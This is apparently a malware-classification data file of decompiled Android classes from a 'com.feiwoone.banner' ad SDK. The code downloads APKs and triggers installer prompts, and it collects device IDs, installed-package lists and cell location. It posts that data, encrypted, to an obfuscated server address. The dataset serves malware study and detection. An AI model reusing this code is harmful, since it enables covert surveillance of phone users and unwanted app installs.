bufferedInputStream3.close();         }  catch (        IOException e22) {         }       }       if (inputStream != null) {         try {           inputStream.close();         }  catch (        IOException e23) {         }       }       httpURLConnection.disconnect();       throw th;     }     return drawable;   }   public static f a(  Context context){     if (b == null) {       b=new f(context);     }     return b;   }   public static boolean b(){     return Environment.getExternalStorageState().equals(""mounted"");   }   public static String c(  String str){     return str.replace("":"",""_"").replace(""/"",""_"");   }   public static boolean d(  String str){     return new File(str).exists();   }   public static void e(  String str){     File file=new File(str);     if (file.exists()) {       file.delete();     }   }   public String a(){     String absolutePath=this.a.getCacheDir().getAbsolutePath();     File file=new File(absolutePath);     if (!file.exists()) {       file.mkdirs();     }     return absolutePath;   }   public String a(  String str){     if (!b()) {       return a();     }     String str2=Environment.getExternalStorageDirectory() + str;     File file=new File(str2);     if (file.exists()) {       return str2;     }     file.mkdirs();     return str2;   }   public boolean a(  String str,  String str2){     HttpURLConnection httpURLConnection;     HttpURLConnection httpURLConnection2;     FileOutputStream fileOutputStream;     InputStream inputStream;     FileOutputStream fileOutputStream2;     FileOutputStream fileOutputStream3=null;     r3=null;     fileOutputStream3=null;     HttpURLConnection httpURLConnection3=null;     FileOutputStream fileOutputStream4=null;     String str3=String.valueOf(b(str)) + c(str2);     if (!d(str3)) {       File file=new File(str3);       try {         httpURLConnection2=(HttpURLConnection)new URL(str2).openConnection();         try {           httpURLConnection2.setConnectTimeout(20000);           httpURLConnection2.setReadTimeout(10000);           httpURLConnection2.setRequestMethod(""GET"");           httpURLConnection2.connect();           inputStream=httpURLConnection2.getInputStream();           fileOutputStream2=new FileOutputStream(file);         }  catch (        FileNotFoundException e) {           httpURLConnection3=httpURLConnection2;           fileOutputStream=null;         } catch (        IOException e2) {         } catch (        Throwable th) {           httpURLConnection=httpURLConnection2;           th=th;         }       }  catch (      FileNotFoundException e3) {         fileOutputStream=null;       } catch (      IOException e4) {         httpURLConnection2=null;       } catch (      Throwable th2) {         th=th2;         httpURLConnection=null;       }       try {         byte[] bArr=new byte[IController.L1_VALUE];         while (true) {           int read=inputStream.read(bArr);           if (read == -1) {             break;           }           fileOutputStream2.write(bArr,0,read);         }         fileOutputStream2.flush();         fileOutputStream2.close();         try {           fileOutputStream2.close();           if (httpURLConnection2 != null) {             httpURLConnection2.disconnect();           }         }  catch (        IOException e5) {         }       }  catch (      FileNotFoundException e6) {         httpURLConnection3=httpURLConnection2;         fileOutputStream=fileOutputStream2;         if (fileOutputStream != null) {           try {             fileOutputStream.close();           }  catch (          IOException e7) {             return false;           }         }         if (httpURLConnection3 != null) {           httpURLConnection3.disconnect();         }         return false;       } catch (      IOException e8) {         fileOutputStream4=fileOutputStream2;         if (fileOutputStream4 != null) {           try {             fileOutputStream4.close();           }  catch (          IOException e9) {             return false;           }         }         if (httpURLConnection2 != null) {           httpURLConnection2.disconnect();         }         return false;       } catch (      Throwable th3) {         fileOutputStream3=fileOutputStream2;         httpURLConnection=httpURLConnection2;         th=th3;         if (fileOutputStream3 != null) {           try {             fileOutputStream3.close();           }  catch (          IOException e10) {             throw th;           }         }         if (httpURLConnection != null) {           httpURLConnection.disconnect();         }         throw th;       }     }     return true;   }   public InputStream b(  String str,  String str2){     FileInputStream fileInputStream;     String str3=String.valueOf(b(str)) + c(str2);     if (d(str3)) {       try {         fileInputStream=new FileInputStream(new File(str3));       }  catch (      FileNotFoundException e) {         return null;       }     }  else {       fileInputStream=null;     }     return fileInputStream;   }   public String b(  Context context,  String str){     if (b()) {       return a(str);     }     StringBuffer stringBuffer=new StringBuffer();     stringBuffer.append(context.getFilesDir().getAbsolutePath());     if (!str.startsWith(""/"")) {       stringBuffer.append(""/"");     }     stringBuffer.append(str);     File file=new File(stringBuffer.toString());     if (!file.exists()) {       file.mkdirs();     }     return stringBuffer.toString();   }   public String b(  String str){     return a(str) != null ? a(str) : a();   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner.e\g.code","public final class g {   private static g b=null;   private ExecutorService a;   private Handler c=new h(this);   private Map d=new ConcurrentHashMap();   private g(){     this.a=null;     if (this.a == null) {       this.a=Executors.newFixedThreadPool(5);     }   }   public static g a(){     if (b == null) {       b=new g();     }     return b;   }   public final void a(  Context context,  com.feiwoone.banner.c.b bVar){     a(context,bVar,new e(this));   }   public final void a(  Context context,  com.feiwoone.banner.c.b bVar,  l lVar){     if (this.d.containsKey(bVar.f())) {       return;     }     f.a(context);     String b2=f.b() ? f.a(context).b(context,""/adfeiwo/apk/"") : f.a(context).b(context,"""");     i iVar=new i(this);     iVar.a(context,bVar,b2);     iVar.a(lVar);     this.d.put(bVar.f(),iVar);     this.a.submit(iVar);   }   public final void a(  com.feiwoone.banner.c.b bVar){     this.d.remove(bVar.f());   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner.e\h.code","public final class h extends Handler {   public h(  g gVar){   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner.e\i.code","public final class i implements Runnable {   private long e;   private l k;   private g m;   private long a=0;   private int b=-1;   private long c=0;   private int d=0;   private String f=null;   private String g=null;   private com.feiwoone.banner.c.b h=null;   private Context i=null;   private URL j=null;   private boolean l=false;   public i(  g gVar){     this.m=gVar;   }   private void a(){     Handler handler;     Notification notification=new Notification();     notification.icon=R.drawable.ic_menu_share;     notification.tickerText=this.h.d();     notification.flags=16;     notification.when=this.e;     notification.setLatestEventInfo(this.i,this.h.d(),String.valueOf(""æ­£åœ¨ä¸‹è½½ï¼Œå·²ä¸‹è½½ _placeholder"".replace(""_placeholder"","""")) + (this.d + 1) + ""%"",PendingIntent.getActivity(this.i,0,new Intent(),0));     handler=this.m.c;     handler.post(new j(this,notification));     this.h.a(this.d);     this.h.a(this.a);     this.i.getSharedPreferences(com.feiwoone.banner.b.a.d,0).edit().putString(this.h.f(),q.a(this.h)).commit();   }   private void a(  String str){     Handler handler;     com.feiwoone.banner.f.e.a(this.i,""ADFEIWO"",this.h.f(),this.h.a(),""12345678"");     Context context=this.i;     String str2=String.valueOf(this.h.f()) + ""_time"";     context.getSharedPreferences(""ADFEIWO"",0).edit().putLong(com.feiwoone.banner.f.f.a(str2,""12345678"",true),System.currentTimeMillis()).commit();     Uri fromFile=Uri.fromFile(new File(str));     Intent intent=new Intent();     intent.setAction(""android.intent.action.VIEW"");     intent.setData(fromFile);     intent.addFlags(268435456);     intent.setClassName(""com.android.packageinstaller"",""com.android.packageinstaller.PackageInstallerActivity"");     handler=this.m.c;     handler.post(new k(this,intent));     this.i.getSharedPreferences(com.feiwoone.banner.b.a.d,0).edit().remove(this.h.f()).commit();     l lVar=this.k;   }   public final void a(  Context context,  com.feiwoone.banner.c.b bVar,  String str){     this.i=context;     this.f=str;     this.h=bVar;     this.g=bVar.b();     try {       this.j=new URL(this.g);     }  catch (    MalformedURLException e) {     }   }   public final void a(  l lVar){     this.k=lVar;   }   @Override public final void run(){     InputStream inputStream;     FileOutputStream fileOutputStream;     HttpURLConnection httpURLConnection;     InputStream inputStream2;     FileOutputStream fileOutputStream2;     r1=0;     HttpURLConnection httpURLConnection2=null;     if (this.j == null) {       throw new IllegalArgumentException(""URL must be init!_placeholder"".replace(""_placeholder"",""""));     }     this.e=System.currentTimeMillis();     this.a=0L;     this.b=-1;     this.d=0;     File file=new File(this.f);     if (!file.exists()) {       file.mkdirs();     }     String str=String.valueOf(this.f) + this.g.substring(this.g.lastIndexOf(""/"") + 1);     File file2=new File(str);     byte[] bArr=new byte[IController.A_VALUE];     try {       httpURLConnection=(HttpURLConnection)this.j.openConnection();       try {         httpURLConnection.setConnectTimeout(20000);         httpURLConnection.setReadTimeout(20000);         if (file2.exists()) {           f.a(this.i);           if (f.b()) {             this.a=file2.length();             httpURLConnection.setRequestProperty(""Range"",""bytes="" + this.a + ""-"");             this.l=true;           }         }         httpURLConnection.connect();         inputStream=httpURLConnection.getInputStream();         try {           try {             this.c=httpURLConnection.getContentLength();             if (file.exists() && (-1 == this.c || file2.length() == this.c)) {               a(str);               if (inputStream != null) {                 try {                   inputStream.close();                 }  catch (                IOException e) {                 }               }               if (httpURLConnection != null) {                 httpURLConnection.disconnect();               }               this.m.a(this.h);               return;             }             int responseCode=httpURLConnection.getResponseCode();             if (responseCode == 200 && file2.exists()) {               file2.delete();               this.a=0L;             }             if (responseCode == 206) {               this.c+=this.a;             }  else {               this.l=false;             }             f.a(this.i);             FileOutputStream fileOutputStream3=f.b() ? new FileOutputStream(file2,this.l) : this.i.openFileOutput(this.g.substring(this.g.lastIndexOf(""/"") + 1),1);             try {               this.h.b(this.c);               this.d=(int)((this.a * 100) / this.c);               a();               while (true) {                 int read=inputStream.read(bArr);                 this.b=read;                 if (read == -1) {                   break;                 }                 Thread.sleep(3L);                 fileOutputStream3.write(bArr,0,this.b);                 this.a+=this.b;                 if (this.a < this.c && (this.a * 100) / this.c > this.d) {                   this.d=(int)((this.a * 100) / this.c);                   if (this.d <= 100) {                     a();                   }                 }               }               if (this.a == this.c) {                 a(str);               }               fileOutputStream3.flush();               fileOutputStream3.close();               if (fileOutputStream3 != null) {                 try {                   fileOutputStream3.close();                 }  catch (                IOException e2) {                 }               }               if (inputStream != null) {                 inputStream.close();               }               if (httpURLConnection != null) {                 httpURLConnection.disconnect();               }               this.m.a(this.h);             }  catch (            FileNotFoundException e3) {               fileOutputStream2=fileOutputStream3;               httpURLConnection2=httpURLConnection;               inputStream2=inputStream;               if (fileOutputStream2 != null) {                 try {                   fileOutputStream2.close();                 }  catch (                IOException e4) {                   this.m.a(this.h);                 }               }               if (inputStream2 != null) {                 inputStream2.close();               }               if (httpURLConnection2 != null) {                 httpURLConnection2.disconnect();               }               this.m.a(this.h);             } catch (            Throwable th) {               fileOutputStream=fileOutputStream3;               r1=httpURLConnection;               th=th;               if (fileOutputStream != null) {                 try {                   fileOutputStream.close();                 }  catch (                IOException e5) {                   this.m.a(this.h);                   throw th;                 }               }               if (inputStream != null) {                 inputStream.close();               }               if (r1 != 0) {                 r1.disconnect();               }               this.m.a(this.h);               throw th;             }           }  catch (          FileNotFoundException e6) {             fileOutputStream2=null;             httpURLConnection2=httpURLConnection;             inputStream2=inputStream;           } catch (          Throwable th2) {             fileOutputStream=null;             r1=httpURLConnection;             th=th2;           }         }  catch (        IOException e7) {           if (0 != 0) {             try {               r1.close();             }  catch (            IOException e8) {               this.m.a(this.h);             }           }           if (inputStream != null) {             inputStream.close();           }           if (httpURLConnection != null) {             httpURLConnection.disconnect();           }           this.m.a(this.h);         } catch (        InterruptedException e9) {           if (0 != 0) {             try {               r1.close();             }  catch (            IOException e10) {               this.m.a(this.h);             }           }           if (inputStream != null) {             inputStream.close();           }           if (httpURLConnection != null) {             httpURLConnection.disconnect();           }           this.m.a(this.h);         } catch (        Exception e11) {           if (0 != 0) {             try {               r1.close();             }  catch (            IOException e12) {               this.m.a(this.h);             }           }           if (inputStream != null) {             inputStream.close();           }           if (httpURLConnection != null) {             httpURLConnection.disconnect();           }           this.m.a(this.h);         }       }  catch (      FileNotFoundException e13) {         fileOutputStream2=null;         inputStream2=null;         httpURLConnection2=httpURLConnection;       } catch (      IOException e14) {         inputStream=null;       } catch (      InterruptedException e15) {         inputStream=null;       } catch (      Exception e16) {         inputStream=null;       } catch (      Throwable th3) {         fileOutputStream=null;         r1=httpURLConnection;         th=th3;         inputStream=null;       }     }  catch (    FileNotFoundException e17) {       inputStream2=null;       fileOutputStream2=null;     } catch (    IOException e18) {       inputStream=null;       httpURLConnection=null;     } catch (    InterruptedException e19) {       inputStream=null;       httpURLConnection=null;     } catch (    Exception e20) {       inputStream=null;       httpURLConnection=null;     } catch (    Throwable th4) {       th=th4;       inputStream=null;       fileOutputStream=null;     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner.e\j.code","public final class j implements Runnable {   private i a;   private final Notification b;   public j(  i iVar,  Notification notification){     this.a=iVar;     this.b=notification;   }   @Override public final void run(){     Context context;     com.feiwoone.banner.c.b bVar;     com.feiwoone.banner.c.b bVar2;     context=this.a.i;     p a=p.a(context);     bVar=this.a.h;     int a2=bVar.a();     bVar2=this.a.h;     a.a(a2,bVar2.c(),this.b);   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner.e\k.code","public final class k implements Runnable {   private i a;   private final Intent b;   public k(  i iVar,  Intent intent){     this.a=iVar;     this.b=intent;   }   @Override public final void run(){     com.feiwoone.banner.c.b bVar;     Context context;     com.feiwoone.banner.c.b bVar2;     com.feiwoone.banner.c.b bVar3;     Context context2;     Context context3;     com.feiwoone.banner.c.b bVar4;     com.feiwoone.banner.c.b bVar5;     bVar=this.a.h;     if (bVar.e()) {       context3=this.a.i;       p a=p.a(context3);       bVar4=this.a.h;       int a2=bVar4.a();       bVar5=this.a.h;       a.a(a2,null,bVar5.d(),""ä¸‹è½½å®Œæˆ�ï¼Œç‚¹å‡»å®‰è£…"",this.b,32);     }  else {       context=this.a.i;       p a3=p.a(context);       bVar2=this.a.h;       int a4=bVar2.a();       bVar3=this.a.h;       a3.a(a4,null,bVar3.d(),""ä¸‹è½½å®Œæˆ�ï¼Œç‚¹å‡»å®‰è£…"",this.b,16);     }     Intent intent=new Intent(this.b);     intent.setFlags(268435456);     context2=this.a.i;     context2.startActivity(intent);   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner.e\l.code","public interface l { } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner.e\m.code","public final class m {   private static m a=null;   private ExecutorService b;   private m(){     this.b=null;     this.b=Executors.newFixedThreadPool(5);   }   public static m a(){     if (a == null) {       a=new m();     }     return a;   }   public final void a(  o oVar){     this.b.submit(oVar);   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner.e\n.code","public interface n {   void a(  boolean z,  String str); } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner.e\o.code","public final class o implements Runnable {   private URL a=null;   private n b;   private String c;   private String d;   private Context e;   public final void a(  Context context,  String str,  String str2,  String str3){     this.e=context;     this.c=str2;     this.d=str3;     try {       this.a=new URL(str);     }  catch (    MalformedURLException e) {     }   }   public final void a(  n nVar){     this.b=nVar;   }   @Override public final void run(){     HttpURLConnection httpURLConnection;     if (this.a == null) {       throw new IllegalArgumentException(""URL must be init!"");     }     try {       try {         if (e.a(this.e) == 12) {           httpURLConnection=(HttpURLConnection)this.a.openConnection(new Proxy(Proxy.Type.HTTP,new InetSocketAddress(android.net.Proxy.getDefaultHost(),android.net.Proxy.getDefaultPort())));         }  else {           httpURLConnection=(HttpURLConnection)this.a.openConnection();         }         httpURLConnection.setRequestMethod(""POST"");         httpURLConnection.setRequestProperty(""content-type"",""application/x-www-form-urlencoded"");         httpURLConnection.addRequestProperty(""appkey"",this.c);         httpURLConnection.setDoOutput(true);         httpURLConnection.setConnectTimeout(20000);         httpURLConnection.setReadTimeout(10000);         new StringBuilder(""json > "").append(this.d);         BufferedWriter bufferedWriter=new BufferedWriter(new OutputStreamWriter(httpURLConnection.getOutputStream()));         bufferedWriter.write(com.feiwoone.banner.f.f.a(this.d,com.feiwoone.banner.f.f.a(this.c),false));         bufferedWriter.close();         BufferedReader bufferedReader=new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));         StringBuilder sb=new StringBuilder();         while (true) {           String readLine=bufferedReader.readLine();           if (readLine == null) {             break;           }  else {             sb.append(readLine);           }         }         bufferedReader.close();         if (TextUtils.isEmpty(sb.toString())) {           this.b.a(false,null);         }  else {           new StringBuilder(""result > "").append(sb.toString());           this.b.a(true,com.feiwoone.banner.f.f.a(sb.toString(),com.feiwoone.banner.f.f.a(this.c)));         }       }  catch (      Exception e) {         this.b.a(false,""Exception"");       }     }  catch (    SocketException e2) {       this.b.a(false,""SocketTimeoutException"");     } catch (    SocketTimeoutException e3) {       this.b.a(false,""SocketTimeoutException"");     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner.e\p.code","public class p {   private static p b;   private NotificationManager a;   private Notification c;   private List d;   private Context e;   private Bitmap f;   private boolean g;   public p(){   }   private p(  Context context){     ""NotificationManagerTool_placeholder"".replace(""_placeholder"","""");     this.a=null;     this.c=null;     this.d=null;     this.g=false;     this.e=context;     if (this.a == null) {       this.a=(NotificationManager)context.getSystemService(""notification"");     }   }   private ImageView a(  View view){     if (!(view instanceof ViewGroup)) {       if (view instanceof ImageView) {         return (ImageView)view;       }       return null;     }     ViewGroup viewGroup=(ViewGroup)view;     for (int childCount=viewGroup.getChildCount(); childCount > 0; childCount--) {       ImageView a=a(viewGroup.getChildAt(childCount - 1));       if (a != null && a.getId() == 16908294) {         return a;       }     }     return null;   }   public static p a(  Context context){     if (b == null) {       b=new p(context);     }     return b;   }   public final void a(  int i){     this.a.cancel(i);   }   public final void a(  int i,  String str,  Notification notification){     try {       if (this.d == null) {         this.d=new ArrayList();       }       StringBuilder sb=new StringBuilder(String.valueOf(f.a(this.e).b(this.e,""/adfeiwo/image/"")));       f.a(this.e);       String sb2=sb.append(f.c(str)).toString();       if (str != null && str.length() > 0 && !this.d.contains(sb2) && notification != null) {         f.a(this.e);         if (f.d(sb2)) {           Bitmap decodeFile=BitmapFactory.decodeFile(sb2);           if (decodeFile == null) {             f.a(this.e);             f.e(sb2);           }  else {             notification.contentView.setImageViewBitmap(a(View.inflate(this.e,notification.contentView.getLayoutId(),null)).getId(),decodeFile);           }         }  else         if (!this.d.contains(sb2)) {           this.d.add(sb2);           a.a().a(this.e,str,new r(this,sb2,i,str,notification));         }       }     }  catch (    Exception e) {     }     this.a.notify(i,notification);     this.a.notify(i,notification);   }   public final void a(  int i,  String str,  String str2,  String str3,  Intent intent,  int i2){     if (this.c == null) {       this.c=new Notification();     }     this.c.icon=R.drawable.ic_menu_share;     this.c.tickerText=""æ­£åœ¨ä¸ºæ‚¨ä¸‹è½½_placeholder"".replace(""_placeholder"","""");     this.c.flags=i2;     this.c.setLatestEventInfo(this.e,str2,str3,PendingIntent.getActivity(this.e,0,intent,67108864));     this.a.notify(i,this.c);   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner.e\q.code","public class q implements d {   private p a;   private final ImageView b;   public static Object a(  String str){     ObjectInputStream objectInputStream;     Throwable th;     ByteArrayInputStream byteArrayInputStream;     Object obj=null;     try {       byteArrayInputStream=new ByteArrayInputStream(Base64.decode(str.getBytes(),0));       try {         objectInputStream=new ObjectInputStream(byteArrayInputStream);       }  catch (      StreamCorruptedException e) {         objectInputStream=null;       } catch (      IOException e2) {         objectInputStream=null;       } catch (      ClassNotFoundException e3) {         objectInputStream=null;       } catch (      Throwable th2) {         objectInputStream=null;         th=th2;       }       try {         obj=objectInputStream.readObject();         try {           objectInputStream.close();           byteArrayInputStream.close();         }  catch (        IOException e4) {         }       }  catch (      StreamCorruptedException e5) {         if (objectInputStream != null) {           try {             objectInputStream.close();           }  catch (          IOException e6) {           }         }         if (byteArrayInputStream != null) {           byteArrayInputStream.close();         }         return obj;       } catch (      IOException e7) {         if (objectInputStream != null) {           try {             objectInputStream.close();           }  catch (          IOException e8) {           }         }         if (byteArrayInputStream != null) {           byteArrayInputStream.close();         }         return obj;       } catch (      ClassNotFoundException e9) {         if (objectInputStream != null) {           try {             objectInputStream.close();           }  catch (          IOException e10) {           }         }         if (byteArrayInputStream != null) {           byteArrayInputStream.close();         }         return obj;       } catch (      Throwable th3) {         th=th3;         if (objectInputStream != null) {           try {             objectInputStream.close();           }  catch (          IOException e11) {             throw th;           }         }         if (byteArrayInputStream != null) {           byteArrayInputStream.close();         }         throw th;       }     }  catch (    StreamCorruptedException e12) {       byteArrayInputStream=null;       objectInputStream=null;     } catch (    IOException e13) {       byteArrayInputStream=null;       objectInputStream=null;     } catch (    ClassNotFoundException e14) {       byteArrayInputStream=null;       objectInputStream=null;     } catch (    Throwable th4) {       objectInputStream=null;       th=th4;       byteArrayInputStream=null;     }     return obj;   }   public static String a(  Object obj){     ObjectOutputStream objectOutputStream;     ByteArrayOutputStream byteArrayOutputStream;     Throwable th;     ByteArrayOutputStream byteArrayOutputStream2;     ObjectOutputStream objectOutputStream2=null;     try {       byteArrayOutputStream=new ByteArrayOutputStream();       try {         objectOutputStream=new ObjectOutputStream(byteArrayOutputStream);         try {           objectOutputStream.writeObject(obj);           String str=new String(Base64.encodeToString(byteArrayOutputStream.toByteArray(),0));           try {             objectOutputStream.close();             byteArrayOutputStream.close();             return str;           }  catch (          IOException e) {             return str;           }         }  catch (        IOException e2) {           objectOutputStream2=objectOutputStream;           byteArrayOutputStream2=byteArrayOutputStream;           if (objectOutputStream2 != null) {             try {               objectOutputStream2.close();             }  catch (            IOException e3) {               return """";             }           }           if (byteArrayOutputStream2 == null) {             return """";           }           byteArrayOutputStream2.close();           return """";         } catch (        Throwable th2) {           th=th2;           if (objectOutputStream != null) {             try {               objectOutputStream.close();             }  catch (            IOException e4) {               throw th;             }           }           if (byteArrayOutputStream != null) {             byteArrayOutputStream.close();           }           throw th;         }       }  catch (      IOException e5) {         byteArrayOutputStream2=byteArrayOutputStream;       } catch (      Throwable th3) {         objectOutputStream=null;         th=th3;       }     }  catch (    IOException e6) {       byteArrayOutputStream2=null;     } catch (    Throwable th4) {       objectOutputStream=null;       byteArrayOutputStream=null;       th=th4;     }   }   @Override public final void a(  Drawable drawable){     Notification notification;     Bitmap bitmap;     if (drawable != null) {       this.a.f=((BitmapDrawable)drawable).getBitmap();       notification=this.a.c;       RemoteViews remoteViews=notification.contentView;       int id=this.b.getId();       bitmap=this.a.f;       remoteViews.setImageViewBitmap(id,bitmap);     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner.e\r.code","public final class r implements d {   private p a;   private final String b;   private final int c;   private final String d;   private final Notification e;   public r(  p pVar,  String str,  int i,  String str2,  Notification notification){     this.a=pVar;     this.b=str;     this.c=i;     this.d=str2;     this.e=notification;   }   @Override public final void a(  Drawable drawable){     List list;     Context context;     list=this.a.d;     list.remove(this.b);     if (BitmapFactory.decodeFile(this.b) != null) {       this.a.a(this.c,this.d,this.e);       return;     }     context=this.a.e;     f.a(context);     f.e(this.b);   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner.f\a.code","public class a {   private static a a;   private String b;   private String c;   private String d;   private String e;   public a(){   }   private a(  Context context){     try {       TelephonyManager telephonyManager=(TelephonyManager)context.getSystemService(""phone"");       String networkOperator=telephonyManager.getNetworkOperator();       this.b=networkOperator.substring(0,3);       this.c=networkOperator.substring(3);       GsmCellLocation gsmCellLocation=(GsmCellLocation)telephonyManager.getCellLocation();       this.d=String.valueOf(gsmCellLocation.getCid());       this.e=String.valueOf(gsmCellLocation.getLac());     }  catch (    Exception e) {       e.getStackTrace();     }   }   public static a a(  Context context){     if (a == null) {       a=new a(context);     }     return a;   }   public static JSONObject a(  Context context,  String str,  String str2){     JSONObject jSONObject=new JSONObject();     String a2=j.a(context);     String b=j.b();     i.a();     String a3=i.a(context,false);     String str3=String.valueOf(j.b(context).a()) + ""*"" + j.b(context).b();     String a4=j.a();     String d=j.d();     String c=j.c();     try {       jSONObject.put(""devid"",a2);       jSONObject.put(""model"",b);       jSONObject.put(""packagenames"",a3);       jSONObject.put(""resolution"",str3);       jSONObject.put(""brand"",a4);       jSONObject.put(""versionrelease"",d);       jSONObject.put(""versioncode"",c);       jSONObject.put(""appkey"",str);       jSONObject.put(""adsdkversion"",str2);       jSONObject.put(""sdktype"",""BANNER"");     }  catch (    JSONException e) {     }     return jSONObject;   }   public String a(){     return this.b;   }   public String b(){     return this.c;   }   public String c(){     return this.d;   }   public String d(){     return this.e;   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner.f\b.code","public final class b {   private static final String a=e();   public static String a(){     return String.valueOf(a) + ""/webviewAdReq"";   }   public static String b(){     return String.valueOf(a) + ""/webviewAdClick"";   }   public static String c(){     return String.valueOf(a) + ""/clientinfo"";   }   public static String d(){     return String.valueOf(a) + ""/installCount"";   }   private static String e(){     try {       return f.a(""H8Zno4EBTQx9HFCC0rcAQqd931fYhjBLaFEZBiEdBCo="",f.a(""123456""));     }  catch (    UnsupportedEncodingException e) {       return """";     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner.f\c.code","public final class c {   private static final char[] a=""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"".toCharArray();   private static final int[] b;   private static final byte[] c; static {     int[] iArr=new int[IController.START_VALUE];     b=iArr;     Arrays.fill(iArr,-1);     int length=a.length;     for (int i=0; i < length; i++) {       b[a[i]]=i;     }     b[61]=0;     byte[] bArr={65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,48,49,50,51,52,53,54,55,56,57,43,47};     c=new byte[128];     for (int i2=0; i2 < 128; i2++) {       c[i2]=-1;     }     for (int i3=65; i3 <= 90; i3++) {       c[i3]=(byte)(i3 - 65);     }     for (int i4=97; i4 <= 122; i4++) {       c[i4]=(byte)((i4 - 97) + 26);     }     for (int i5=48; i5 <= 57; i5++) {       c[i5]=(byte)((i5 - 48) + 52);     }     c[43]=62;     c[47]=63;   }   public static final String a(  byte[] bArr,  boolean z){     return new String(b(bArr,z));   }   public static final byte[] a(  java.lang.String r10){     throw new UnsupportedOperationException(""Method not decompiled: com.feiwoone.banner.f.c.a(java.lang.String):byte[]"");   }   private static char[] b(  byte[] bArr,  boolean z){     int length=bArr != null ? bArr.length : 0;     if (length == 0) {       return new char[0];     }     int i=(length / 3) * 3;     int i2=(((length - 1) / 3) + 1) << 2;     int i3=i2 + (z ? ((i2 - 1) / 76) << 1 : 0);     char[] cArr=new char[i3];     int i4=0;     int i5=0;     int i6=0;     while (i6 < i) {       int i7=i6 + 1;       int i8=i7 + 1;       int i9=((bArr[i7] & 255) << 8) | ((bArr[i6] & 255) << 16);       i6=i8 + 1;       int i10=i9 | (bArr[i8] & 255);       int i11=i5 + 1;       cArr[i5]=a[(i10 >>> 18) & 63];       int i12=i11 + 1;       cArr[i11]=a[(i10 >>> 12) & 63];       int i13=i12 + 1;       cArr[i12]=a[(i10 >>> 6) & 63];       i5=i13 + 1;       cArr[i13]=a[i10 & 63];       if (z && (i4=i4 + 1) == 19 && i5 < i3 - 2) {         int i14=i5 + 1;         cArr[i5]='\r';         cArr[i14]='\n';         i5=i14 + 1;         i4=0;       }     }     int i15=length - i;     if (i15 > 0) {       int i16=(i15 == 2 ? (bArr[length - 1] & 255) << 2 : 0) | ((bArr[i] & 255) << 10);       cArr[i3 - 4]=a[i16 >> 12];       cArr[i3 - 3]=a[(i16 >>> 6) & 63];       cArr[i3 - 2]=i15 == 2 ? a[i16 & 63] : '=';       cArr[i3 - 1]='=';     }     return cArr;   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner.f\d.code","public final class d {   private static String a=""ClearCacheUtil"";   private static int a(  File file,  int i){     Exception e;     int i2;     if (file == null || !file.isDirectory()) {       return 0;     }     try {       i2=0;       for (      File file2 : file.listFiles()) {         try {           if (file2.isDirectory()) {             i2+=a(file2,i);           }           if (file2.lastModified() < new Date().getTime() - (i * 86400000) && file2.delete()) {             i2++;           }         }  catch (        Exception e2) {           e=e2;           String str=a;           String.format(""Failed to clean the cache, error %s"",e.getMessage());           return i2;         }       }       return i2;     }  catch (    Exception e3) {       e=e3;       i2=0;     }   }   public static void a(  Context context,  int i){     String str=a;     String.format(""Starting cache prune, deleting files older than %d days"",3);     int a2=a(context.getCacheDir(),3);     String str2=a;     String.format(""Cache pruning completed, %d files deleted"",Integer.valueOf(a2));   } } "
